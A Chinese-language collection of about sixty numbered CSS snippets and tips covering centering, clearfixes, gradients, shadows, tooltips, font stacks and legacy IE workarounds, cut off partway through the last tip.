    <content type="text"><![CDATA[1、垂直对齐&emsp;&emsp;如果你用CSS，则你会有困惑：我该怎么垂直对齐容器中的元素？现在，利用CSS3的Transform，可以很优雅的解决这个困惑：1234567.verticalcenter&#123;position: relative;top: 50%;-webkit-transform: translateY(-50%);-o-transform: translateY(-50%);transform: translateY(-50%);&#125;&emsp;&emsp;使用这个技巧，从单行文本、段落到box，都会垂直对齐。目前浏览器对Transform的支持是需要关注的，Chrome 4, Opera 10, Safari 3, Firefox 3, and Internet Explorer 9.均支持该属性。&nbsp;2、伸展一个元素到窗口高度&emsp;&emsp;在具体场景中，你可能想要将一个元素伸展到窗口高度，基本元素的调整只能调整容器的大小,因此要使一个元素伸展到窗口高度，我们需要伸展顶层元素：html和body:123html,body&#123;height: 100%;&#125;然后将100%应用到任何元素的高：1div&#123;height: 100%;&#125;&nbsp;3、基于文件格式使用不同的样式&emsp;&emsp;为了更容易知道链接的目标，有时你想让一些链接看起来和其它的不同。下面的片段在文本链接前添加一个图标，对不同的资源使用不同的图标或图片：12345678910111213141516a[href^="http://"]&#123;padding-right: 20px;background: url(external.gif) no-repeat center right;&#125;/* emails */a[href^="mailto:"]&#123;padding-right: 20px;background: url(email.png) no-repeat center right;&#125;/* pdfs */a[href$=".pdf"]&#123;padding-right: 20px;background: url(pdf.png) no-repeat center right;&#125;&nbsp;4、创建跨浏览器的图像灰度&emsp;&emsp;灰度有时看起来简约和优雅，能为网站呈现更深层次的色调。在示例中，我们将对一个SVG图像添加灰度过滤：12345&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;&lt;filter id="grayscale"&gt;&lt;feColorMatrix type="matrix" values="0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0 0 0 1 0"/&gt;&lt;/filter&gt;&lt;/svg&gt;为了跨浏览器，会用到filter属性：12345img &#123;filter: url(filters.svg#grayscale); /* Firefox 3.5+ */filter: gray; /* IE6-9 */-webkit-filter: grayscale(1); /* Google Chrome, Safari 6+ &amp; Opera 15+ */&#125;&nbsp;5、背景渐变动画&emsp;&emsp;CSS中最具诱惑的一个功能是能添加动画效果，除了渐变，你可以给背景色、透明度、元素大小添加动画。目前，你不能为渐变添加动画，但下面的代码可能有帮助。它通过改变背景位置，让它看起来有动画效果。12345678910button&#123;background-image: linear-gradient(#5187c4, #1c2f45);background-size: auto 200%;background-position: 0 100%;transition: background-position 0.5s;&#125;button:hover&#123;background-position: 0 0;&#125;&nbsp;6、CSS：表格列宽自适用对于表格，当谈到调整列宽时，是比较痛苦的。然后，这里有一个可以使用的技巧：给td元素添加 white-space: nowrap;能让文本正确的换行1td&#123;white-space: nowrap;&#125;&nbsp;7、只在一边或两边显示盒子阴影&emsp;&emsp;如果你要一个盒阴影，试试这个技巧，能为任一边添加阴影。为了实现这个，首先定义一个有具体宽高的盒子，然后正确定位:after伪类。实现底边阴影的代码如下：12345678910111213141516171819202122232425.box-shadow&#123;background-color: #FF8020;width: 160px;height: 90px;margin-top: -45px;margin-left: -80px;position: absolute;top: 50%;left: 50%;&#125;.box-shadow:after&#123;content: "";width: 150px;height: 1px;margin-top: 88px;margin-left: -75px;display: block;position: absolute;left: 50%;z-index: -1;-webkit-box-shadow: 0px 0px 8px 2px #000000;-moz-box-shadow: 0px 0px 8px 2px #000000;box-shadow: 0px 0px 8px 2px #000000;&#125;&nbsp;8、包裹长文本&emsp;&emsp;如果你碰到一个比自身容器长的文本，这个技巧对你很有用。在这个示例中，默认时，不管容器的宽度，文本都将水平填充。简单的CSS代码就能在容器中调整文本：1234pre&#123;white-space: pre-line;word-wrap: break-word;&#125;效果看起来如下：&nbsp;9、制造模糊文本想要让文本模糊？可以使用color透明和text-shadow实现。1234.blurry-text &#123;color: transparent;text-shadow: 0 0 5px rgba(0,0,0,0.5);&#125;&nbsp;10、用CSS动画实现省略号动画&emsp;&emsp;这个片段将帮助你制造一个ellipsis的动画，对于简单的加载状态是很有用的，而不用去使用gif图像。12345678910111213141516.loading:after &#123;overflow: hidden;display: inline-block;vertical-align: bottom;animation: ellipsis 2s infinite;content: "\2026"; /* ascii code for the ellipsis character */&#125;@keyframes ellipsis &#123;from &#123;width: 2px;&#125;to &#123;width: 15px;&#125;&#125;11、样式重置1234567891011html,body,div,span,applet,object,iframe,h1,h2,h3,h4,h5,h6,p,blockquote,pre,a,abbr,acronym,address,big,cite,code,del,dfn,em,img,ins,kbd,q,s,samp,small,strike,strong,sub,sup,tt,var,b,u,i,center,dl,dt,dd,ol,ul,li,fieldset,form,label,legend,table,caption,tbody,tfoot,thead,tr,th,td,article,aside,canvas,details,embed,figure,figcaption,footer,header,hgroup,menu,nav,output,ruby,section,summary,time,mark,audio,video&#123;margin:0;padding:0;border:0;font-size:100%;font:inherit;vertical-align:baseline;outline:none;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box&#125;html&#123;height:101%&#125;body&#123;font-size:62.5%;line-height:1;font-family:Arial,Tahoma,sans-serif&#125;article,aside,details,figcaption,figure,footer,header,hgroup,menu,nav,section&#123;display:block&#125;ol,ul&#123;list-style:none&#125;blockquote,q&#123;quotes:none&#125;blockquote:before,blockquote:after,q:before,q:after&#123;content:'';content:none&#125;strong&#123;font-weight:bold&#125;table&#123;border-collapse:collapse;border-spacing:0&#125;img&#123;border:0;max-width:100%&#125;p&#123;font-size:1.2em;line-height:1.0em;color:#333&#125;&nbsp;12、典型的CSS清除浮动1234.clearfix:after &#123; content: "."; display: block; clear: both; visibility: hidden; line-height: 0; height: 0; &#125;.clearfix &#123; display: inline-block; &#125;html[xmlns] .clearfix &#123; display: block; &#125;* html .clearfix &#123; height: 1%; &#125;&nbsp;13、新版清除浮动（2011）12345.clearfix:before, .container:after &#123; content: ""; display: table; &#125;.clearfix:after &#123; clear: both; &#125;/* IE 6/7 */.clearfix &#123; zoom: 1; &#125;&nbsp;14、跨浏览器的透明123456.transparent &#123;filter: alpha(opacity=50); /* internet explorer */-khtml-opacity: 0.5; /* khtml, old safari */-moz-opacity: 0.5; /* mozilla, netscape */opacity: 0.5; /* fx, safari, opera */&#125;&nbsp;15、CSS引用模板123blockquote&#123;background:#f9f9f9;border-left:10px solid #ccc;margin:1.5em 10px;padding:.5em 10px;quotes:"\201C""\201D""\2018""\2019"&#125;blockquote:before&#123;color:#ccc;content:open-quote;font-size:4em;line-height:.1em;margin-right:.25em;vertical-align:-.4em&#125;blockquote p&#123;display:inline&#125;&nbsp;16、个性圆角12345678910111213141516171819#container &#123;-webkit-border-radius: 4px 3px 6px 10px;-moz-border-radius: 4px 3px 6px 10px;-o-border-radius: 4px 3px 6px 10px;border-radius: 4px 3px 6px 10px;&#125;/* alternative syntax broken into each line */#container &#123;-webkit-border-top-left-radius: 4px;-webkit-border-top-right-radius: 3px;-webkit-border-bottom-right-radius: 6px;-webkit-border-bottom-left-radius: 10px;-moz-border-radius-topleft: 4px;-moz-border-radius-topright: 3px;-moz-border-radius-bottomright: 6px;-moz-border-radius-bottomleft: 10px;&#125;&nbsp;17、通用媒体查询123456789101112131415161718192021222324252627282930313233343536373839404142434445/* Smartphones (portrait and landscape) ----------- */@media only screenand (min-device-width : 320px) and (max-device-width : 480px) &#123;/* Styles */&#125;/* Smartphones (landscape) ----------- */@media only screen and (min-width : 321px) &#123;/* Styles */&#125;/* Smartphones (portrait) ----------- */@media only screen and (max-width : 320px) &#123;/* Styles */&#125;/* iPads (portrait and landscape) ----------- */@media only screen and (min-device-width : 768px) and (max-device-width : 1024px) &#123;/* Styles */&#125;/* iPads (landscape) ----------- */@media only screen and (min-device-width : 768px) and (max-device-width : 1024px) and (orientation : landscape) &#123;/* Styles */&#125;/* iPads (portrait) ----------- */@media only screen and (min-device-width : 768px) and (max-device-width : 1024px) and (orientation : portrait) &#123;/* Styles */&#125;/* Desktops and laptops ----------- */@media only screen and (min-width : 1224px) &#123;/* Styles */&#125;/* Large screens ----------- */@media only screen and (min-width : 1824px) &#123;/* Styles */&#125;/* iPhone 4 ----------- */@media only screen and (-webkit-min-device-pixel-ratio:1.5), only screen and (min-device-pixel-ratio:1.5) &#123;/* Styles */&#125;&nbsp;18、现代字体栈1234567891011121314151617181920212223/* Times New Roman-based serif */font-family: Cambria, "Hoefler Text", Utopia, "Liberation Serif", "Nimbus Roman No9 L Regular", Times, "Times New Roman", serif;/* A modern Georgia-based serif */font-family: Constantia, "Lucida Bright", Lucidabright, "Lucida Serif", Lucida, "DejaVu Serif," "Bitstream Vera Serif", "Liberation Serif", Georgia, serif;/*A more traditional Garamond-based serif */font-family: "Palatino Linotype", Palatino, Palladio, "URW Palladio L", "Book Antiqua", Baskerville, "Bookman Old Style", "Bitstream Charter", "Nimbus Roman No9 L", Garamond, "Apple Garamond", "ITC Garamond Narrow", "New Century Schoolbook", "Century Schoolbook", "Century Schoolbook L", Georgia, serif;/*The Helvetica/Arial-based sans serif */font-family: Frutiger, "Frutiger Linotype", Univers, Calibri, "Gill Sans", "Gill Sans MT", "Myriad Pro", Myriad, "DejaVu Sans Condensed", "Liberation Sans", "Nimbus Sans L", Tahoma, Geneva, "Helvetica Neue", Helvetica, Arial, sans-serif;/*The Verdana-based sans serif */font-family: Corbel, "Lucida Grande", "Lucida Sans Unicode", "Lucida Sans", "DejaVu Sans", "Bitstream Vera Sans", "Liberation Sans", Verdana, "Verdana Ref", sans-serif;/*The Trebuchet-based sans serif */font-family: "Segoe UI", Candara, "Bitstream Vera Sans", "DejaVu Sans", "Bitstream Vera Sans", "Trebuchet MS", Verdana, "Verdana Ref", sans-serif;/*The heavier "Impact" sans serif */font-family: Impact, Haettenschweiler, "Franklin Gothic Bold", Charcoal, "Helvetica Inserat", "Bitstream Vera Sans Bold", "Arial Black", sans-serif;/*The monospace */font-family: Consolas, "Andale Mono WT", "Andale Mono", "Lucida Console", "Lucida Sans Typewriter", "DejaVu Sans Mono", "Bitstream Vera Sans Mono", "Liberation Mono", "Nimbus Mono L", Monaco, "Courier New", Courier, monospace;&nbsp;19、自定义文本选择123::selection &#123; background: #e2eae2; &#125;::-moz-selection &#123; background: #e2eae2; &#125;::-webkit-selection &#123; background: #e2eae2; &#125;&nbsp;20、为logo隐藏H11234567h1 &#123;text-indent:-9999px;margin:0 auto;width:320px;height:85px;background:transparent url("images/logo.png") no-repeat scroll;&#125;&nbsp;21、图片边框偏光12345678910img.polaroid &#123;background:#000; /*Change this to a background image or remove*/border:solid #fff;border-width:6px 6px 20px 6px;box-shadow:1px 1px 5px #333; /* Standard blur at 5px. Increase for more depth */-webkit-box-shadow:1px 1px 5px #333;-moz-box-shadow:1px 1px 5px #333;height:200px; /*Set to height of your image or desired div*/width:200px; /*Set to width of your image or desired div*/&#125;&nbsp;22、锚链接伪类1234a:link&#123;color:blue&#125;a:visited&#123;color:purple&#125;a:hover&#123;color:red&#125;a:active&#123;color:yellow&#125;&nbsp;23、奇特的CSS引用123456789101112131415161718192021222324252627282930313233343536.has-pullquote:before &#123;/* Reset metrics. */padding: 0;border: none;/* Content */content: attr(data-pullquote);/* Pull out to the right, modular scale based margins. */float: right;width: 320px;margin: 12px -140px 24px 36px;/* Baseline correction */position: relative;top: 5px;/* Typography (30px line-height equals 25% incremental leading) */font-size: 23px;line-height: 30px;&#125;.pullquote-adelle:before &#123;font-family: "adelle-1", "adelle-2";font-weight: 100;top: 10px !important;&#125;.pullquote-helvetica:before &#123;font-family: "Helvetica Neue", Arial, sans-serif;font-weight: bold;top: 7px !important;&#125;.pullquote-facit:before &#123;font-family: "facitweb-1", "facitweb-2", Helvetica, Arial, sans-serif;font-weight: bold;top: 7px !important;&#125;&nbsp;24、CSS3：全屏背景1234567html &#123;background:url('images/bg.jpg') no-repeat center center fixed;-webkit-background-size:cover;-moz-background-size:cover;-o-background-size:cover;background-size:cover&#125;&nbsp;25、内容垂直居中12345.container &#123;min-height:6.5em;display:table-cell;vertical-align:middle;&#125;&nbsp;26、强制出现垂直滚动条1html &#123; height: 101% &#125;&nbsp;27、CSS3渐变模板123456789#colorbox &#123;background: #629721;background-image: -webkit-gradient(linear, left top, left bottom, from(#83b842), to(#629721));background-image: -webkit-linear-gradient(top, #83b842, #629721);background-image: -moz-linear-gradient(top, #83b842, #629721);background-image: -ms-linear-gradient(top, #83b842, #629721);background-image: -o-linear-gradient(top, #83b842, #629721);background-image: linear-gradient(top, #83b842, #629721);&#125;&nbsp;28、@font-face模板12345678@font-face &#123;font-family: 'MyWebFont';src: url('webfont.eot'); /* IE9 Compat Modes */src: url('webfont.eot?#iefix') format('embedded-opentype'), /* IE6-IE8 */ url('webfont.woff') format('woff'), /* Modern Browsers */ url('webfont.ttf') format('truetype'), /* Safari, Android, iOS */ url('webfont.svg#svgFontName') format('svg'); /* Legacy iOS */&#125;body &#123;font-family: 'MyWebFont', Arial, sans-serif;&#125;&nbsp;29、缝合CSS3元素123456789101112131415161718192021222324252627282930313233p &#123;position: relative;z-index: 1;padding: 10px;margin: 10px;font-size: 21px;line-height: 1.3em;color: #fff;background: #ff0030;-webkit-box-shadow: 0 0 0 4px #ff0030, 2px 1px 4px 4px rgba(10,10,0,.5);-moz-box-shadow: 0 0 0 4px #ff0030, 2px 1px 4px 4px rgba(10,10,0,.5);box-shadow: 0 0 0 4px #ff0030, 2px 1px 6px 4px rgba(10,10,0,.5);-webkit-border-radius: 3px;-moz-border-radius: 3px;border-radius: 3px;&#125;p:before &#123;content: "";position: absolute;z-index: -1;top: 3px;bottom: 3px;left : 3px;right: 3px;border: 2px dashed #fff;&#125;p a &#123;color: #fff;text-decoration: none;&#125;p a:hover, p a:focus, p a:active &#123;text-decoration: underline;&#125;&nbsp;30、CSS3 斑马线1tbody tr:nth-child(odd) &#123;background-color: #ccc;&#125;&nbsp;31、有趣的&amp;12345.amp &#123;font-family: Baskerville, 'Goudy Old Style', Palatino, 'Book Antiqua', serif;font-style: italic;font-weight: normal;&#125;&nbsp;32、大字段落12345678p:first-letter &#123;display: block;margin: 5px 0 0 5px;float: left;color: #ff3366;font-size: 5.4em;font-family: Georgia, Times New Roman, serif;&#125;&nbsp;33、内部CSS3 盒阴影12345#mydiv &#123;-moz-box-shadow: inset 2px 0 4px #000;-webkit-box-shadow: inset 2px 0 4px #000;box-shadow: inset 2px 0 4px #000;&#125;&nbsp;34、外部CSS3 盒阴影12345#mydiv &#123;-webkit-box-shadow: 0 2px 2px -2px rgba(0, 0, 0, 0.52);-moz-box-shadow: 0 2px 2px -2px rgba(0, 0, 0, 0.52);box-shadow: 0 2px 2px -2px rgba(0, 0, 0, 0.52);&#125;&nbsp;35、三角形列表项目符号1234567891011121314151617ul &#123;margin: 0.75em 0;padding: 0 1em;list-style: none;&#125;li:before &#123;content: "";border-color: transparent #111;border-style: solid;border-width: 0.35em 0 0.35em 0.45em;display: block;height: 0;width: 0;left: -1em;top: 0.9em;position: relative;&#125;&nbsp;36、固定宽度的居中布局1234#page-wrap &#123;width: 800px;margin: 0 auto;&#125;&nbsp;37、CSS3 列文本123456789#columns-3 &#123;text-align: justify;-moz-column-count: 3;-moz-column-gap: 12px;-moz-column-rule: 1px solid #c4c8cc;-webkit-column-count: 3;-webkit-column-gap: 12px;-webkit-column-rule: 1px solid #c4c8cc;&#125;&nbsp;38、CSS固定页脚1234567891011121314#footer &#123;position: fixed;left: 0px;bottom: 0px;height: 30px;width: 100%;background: #444;&#125;/* IE 6 */* html #footer &#123;position: absolute;top: expression((0-(footer.offsetHeight)+(document.documentElement.clientHeight ? document.documentElement.clientHeight : document.body.clientHeight)+(ignoreMe = document.documentElement.scrollTop ? document.documentElement.scrollTop : document.body.scrollTop))+'px');&#125;&nbsp;39、IE6的PNG透明修复123456789101112.bg &#123;width:200px;height:100px;background: url(/folder/yourimage.png) no-repeat;_background:none;_filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='/folder/yourimage.png', sizingMethod='crop');&#125;/* 1px gif method */img, .png &#123;position: relative;behavior: expression((this.runtimeStyle.behavior="none")&amp;&amp;(this.pngSet?this.pngSet=true:(this.nodeName == "IMG" &amp;&amp; this.src.toLowerCase().indexOf('.png')&gt;-1?(this.runtimeStyle.backgroundImage = "none", this.runtimeStyle.filter = "progid:DXImageTransform.Microsoft.AlphaImageLoader(src='" + this.src + "', sizingMethod='image')", this.src = "images/transparent.gif"):(this.origBg = this.origBg? this.origBg :this.currentStyle.backgroundImage.toString().replace('url("', '').replace('")', ''), this.runtimeStyle.filter = "progid:DXImageTransform.Microsoft.AlphaImageLoader(src='" + this.origBg + "', sizingMethod='crop')", this.runtimeStyle.backgroundImage = "none")), this.pngSet=true));&#125;&nbsp;40、跨浏览器设置最小高度12345#container &#123;min-height: 550px;height: auto !important;height: 550px;&#125;&nbsp;41、CSS3 鲜艳的输入12345678910111213141516input[type=text], textarea &#123;-webkit-transition: all 0.30s ease-in-out;-moz-transition: all 0.30s ease-in-out;-ms-transition: all 0.30s ease-in-out;-o-transition: all 0.30s ease-in-out;outline: none;padding: 3px 0px 3px 3px;margin: 5px 1px 3px 0px;border: 1px solid #ddd;&#125;input[type=text]:focus, textarea:focus &#123;box-shadow: 0 0 5px rgba(81, 203, 238, 1);padding: 3px 0px 3px 3px;margin: 5px 1px 3px 0px;border: 1px solid rgba(81, 203, 238, 1);&#125;&nbsp;42、基于文件类型的链接样式123456789101112131415/* external links */a[href^="http://"] &#123;padding-right: 13px;background: url('external.gif') no-repeat center right;&#125;/* emails */a[href^="mailto:"] &#123;padding-right: 20px;background: url('email.png') no-repeat center right;&#125;/* pdfs */a[href$=".pdf"] &#123;padding-right: 18px;background: url('acrobat.png') no-repeat center right;&#125;&nbsp;43、强制换行1234567pre&#123;white-space: pre-wrap; /* css-3 */white-space: -moz-pre-wrap; /* Mozilla, since 1999 */white-space: -pre-wrap; /* Opera 4-6 */white-space: -o-pre-wrap; /* Opera 7 */word-wrap: break-word; /* Internet Explorer 5.5+ */&#125;&nbsp;44、在可点击的项目上强制手型1a[href], input[type='submit'], input[type='image'], label[for], select, button, .pointer &#123;cursor: pointer;&#125;&nbsp;45、网页顶部盒阴影123456789101112body:before &#123;content: "";position: fixed;top: -10px;left: 0;width: 100%;height: 10px;-webkit-box-shadow: 0px 0px 10px rgba(0,0,0,.8);-moz-box-shadow: 0px 0px 10px rgba(0,0,0,.8);box-shadow: 0px 0px 10px rgba(0,0,0,.8);z-index: 100;&#125;&nbsp;46、CSS3对话气泡123456789101112131415161718192021222324252627282930313233343536.chat-bubble &#123;background-color: #ededed;border: 2px solid #666;font-size: 35px;line-height: 1.3em;margin: 10px auto;padding: 10px;position: relative;text-align: center;width: 300px;-moz-border-radius: 20px;-webkit-border-radius: 20px;-moz-box-shadow: 0 0 5px #888;-webkit-box-shadow: 0 0 5px #888;font-family: 'Bangers', arial, serif;&#125;.chat-bubble-arrow-border &#123;border-color: #666 transparent transparent transparent;border-style: solid;border-width: 20px;height: 0;width: 0;position: absolute;bottom: -42px;left: 30px;&#125;.chat-bubble-arrow &#123;border-color: #ededed transparent transparent transparent;border-style: solid;border-width: 20px;height: 0;width: 0;position: absolute;bottom: -39px;left: 30px;&#125;&nbsp;47、H1-H5默认样式123456h1, h2, h3, h4, h5 &#123;color: #005a9c;&#125;h1 &#123;font-size: 2.6em;line-height: 2.45em;&#125;h2 &#123;font-size: 2.1em;line-height: 1.9em;&#125;h3 &#123;font-size: 1.8em;line-height: 1.65em;&#125;h4 &#123;font-size: 1.65em;line-height: 1.4em;&#125;h5 &#123;font-size: 1.4em;line-height: 1.25em;&#125;&nbsp;48、纯CSS背景噪音1234body &#123;background-image: url(data:image/png;base64,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);background-color: #0094d0;&#125;&nbsp;49、持久的列表排序1234567891011121314151617181920ol.chapters &#123;list-style: none;margin-left: 0;&#125;ol.chapters &gt; li:before &#123;content: counter(chapter) ". ";counter-increment: chapter;font-weight: bold;float: left;width: 40px;&#125;ol.chapters li &#123;clear: left;&#125;ol.start &#123;counter-reset: chapter;&#125;ol.continue &#123;counter-reset: chapter 11;&#125;&nbsp;50、CSS悬浮提示文本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960a &#123;border-bottom:1px solid #bbb;color:#666;display:inline-block;position:relative;text-decoration:none;&#125;a:hover, a:focus &#123;color: #36c;&#125;a:active &#123;top: 1px;&#125;/* Tooltip styling */a[data-tooltip]:after &#123;border-top: 8px solid #222;border-top: 8px solid hsla(0,0%,0%,.85);border-left: 8px solid transparent;border-right: 8px solid transparent;content: "";display: none;height: 0;width: 0;left: 25%;position: absolute;&#125;a[data-tooltip]:before &#123;background: #222;background: hsla(0,0%,0%,.85);color: #f6f6f6;content: attr(data-tooltip);display: none;font-family: sans-serif;font-size: 14px;height: 32px;left: 0;line-height: 32px;padding: 0 15px;position: absolute;text-shadow: 0 1px 1px hsla(0,0%,0%,1);white-space: nowrap;-webkit-border-radius: 5px;-moz-border-radius: 5px;-o-border-radius: 5px;border-radius: 5px;&#125;a[data-tooltip]:hover:after &#123;display: block;top: -9px;&#125;a[data-tooltip]:hover:before &#123;display: block;top: -41px;&#125;a[data-tooltip]:active:after &#123;top: -10px;&#125;a[data-tooltip]:active:before &#123;top: -42px;&#125;&nbsp;51、深灰色的圆形按钮12345678910111213141516171819202122232425262728293031.graybtn &#123;-moz-box-shadow:inset 0px 1px 0px 0px #ffffff;-webkit-box-shadow:inset 0px 1px 0px 0px #ffffff;box-shadow:inset 0px 1px 0px 0px #ffffff;background:-webkit-gradient( linear, left top, left bottom, color-stop(0.05, #ffffff), color-stop(1, #d1d1d1) );background:-moz-linear-gradient( center top, #ffffff 5%, #d1d1d1 100% );filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffffff', endColorstr='#d1d1d1');background-color:#ffffff;-moz-border-radius:6px;-webkit-border-radius:6px;border-radius:6px;border:1px solid #dcdcdc;display:inline-block;color:#777777;font-family:arial;font-size:15px;font-weight:bold;padding:6px 24px;text-decoration:none;text-shadow:1px 1px 0px #ffffff;&#125;.graybtn:hover &#123;background: -webkit-gradient( linear, left top, left bottom, color-stop(0.05, #d1d1d1), color-stop(1, #ffffff) );background: -moz-linear-gradient( center top, #d1d1d1 5%, #ffffff 100% ); filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#d1d1d1', endColorstr='#ffffff');background-color: #d1d1d1;&#125;.graybtn:active &#123;position: relative;top: 1px;&#125;&nbsp;52、在可打印的网页中显示URLs123@media print &#123;a:after &#123;content: " [" attr(href) "] ";&#125;&#125;&nbsp;53、禁用移动Webkit的选择高亮12345678body &#123;-webkit-touch-callout: none;-webkit-user-select: none;-khtml-user-select: none;-moz-user-select: none;-ms-user-select: none;user-select: none;&#125;&nbsp;54、CSS3 圆点图案1234body &#123;background: radial-gradient(circle, white 10%, transparent 10%), radial-gradient(circle, white 10%, black 10%) 50px 50px;background-size: 100px 100px;&#125;&nbsp;55、CSS3 方格图案123456body &#123;background-color: white;background-image: linear-gradient(45deg, black 25%, transparent 25%, transparent 75%, black 75%, black), linear-gradient(45deg, black 25%, transparent 25%, transparent 75%, black 75%, black);background-size: 100px 100px;background-position: 0 0, 50px 50px;&#125;&nbsp;56、Github的fork色带1234567891011121314151617181920212223242526272829.ribbon &#123;background-color: #a00;overflow: hidden;/* top left corner */position: absolute;left: -3em;top: 2.5em;/* 45 deg ccw rotation */-moz-transform: rotate(-45deg); -webkit-transform: rotate(-45deg);/* shadow */-moz-box-shadow: 0 0 1em #888;-webkit-box-shadow: 0 0 1em #888;&#125;.ribbon a &#123;border: 1px solid #faa;color: #fff;display: block;font: bold 81.25% 'Helvetiva Neue', Helvetica, Arial, sans-serif;margin: 0.05em 0 0.075em 0;padding: 0.5em 3.5em;text-align: center;text-decoration: none;/* shadow */text-shadow: 0 0 0.5em #444;&#125;&nbsp;57、CSS font属性缩写1p&#123;font: italic small-caps bold 1.2em/1.0em Arial, Tahoma, Helvetica;&#125;&nbsp;58、论文页面的卷曲效果12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849ul.box &#123;position: relative;z-index: 1; /* prevent shadows falling behind containers with backgrounds */overflow: hidden;list-style: none;margin: 0;padding: 0;&#125;ul.box li&#123;position: relative;float: left;width: 250px;height: 150px;padding: 0;border: 1px solid #efefef;margin: 0 30px 30px 0;background: #fff;-webkit-box-shadow: 0 1px 4px rgba(0, 0, 0, 0.27), 0 0 40px rgba(0, 0, 0, 0.06) inset;-moz-box-shadow: 0 1px 4px rgba(0, 0, 0, 0.27), 0 0 40px rgba(0, 0, 0, 0.06) inset;box-shadow: 0 1px 4px rgba(0, 0, 0, 0.27), 0 0 40px rgba(0, 0, 0, 0.06) inset;&#125;ul.box li:before, ul.box li:after &#123;content: '';z-index: -1;position: absolute;left: 10px;bottom: 10px;width: 70%;max-width: 300px; /* avoid rotation causing ugly appearance at large container widths */max-height: 100px;height: 55%;-webkit-box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);-moz-box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);-webkit-transform: skew(-15deg) rotate(-6deg);-moz-transform: skew(-15deg) rotate(-6deg);-ms-transform: skew(-15deg) rotate(-6deg);-o-transform: skew(-15deg) rotate(-6deg);transform: skew(-15deg) rotate(-6deg);&#125;ul.box li:after &#123;left: auto;right: 10px;-webkit-transform: skew(15deg) rotate(6deg);-moz-transform: skew(15deg) rotate(6deg);-ms-transform: skew(15deg) rotate(6deg);-o-transform: skew(15deg) rotate(6deg);transform: skew(15deg) rotate(6deg);&#125;&nbsp;59、鲜艳的锚链接1234567a&#123;color:#00e&#125;a:visited&#123;color:#551a8b&#125;a:hover&#123;color:#06e&#125;a:focus&#123;outline:thin 